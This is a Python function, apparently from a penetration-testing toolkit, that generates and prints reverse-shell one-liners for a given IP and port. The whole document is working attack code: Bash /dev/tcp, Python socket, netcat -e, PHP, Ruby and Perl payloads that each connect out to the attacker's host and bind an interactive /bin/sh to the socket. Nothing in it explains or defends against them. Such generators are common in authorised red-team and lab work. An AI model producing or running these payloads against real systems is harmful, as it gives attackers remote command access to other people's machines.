# ============================================
# REVERSE SHELL GENERATOR
# ============================================
def generate_reverse_shells(ip, port):
    shells = {
        'Bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        'Python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'Netcat': f"nc -e /bin/sh {ip} {port}",
        'PHP': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'Ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'Perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    }
    
    print(f"Reverse Shells for {ip}:{port}")
    print("=" * 50)
    
    for shell_type, command in shells.items():
        print(f"\n{shell_type}:")
        print(command)
    
    return shells

# Usage
# generate_reverse_shells("10.10.10.1", 4444)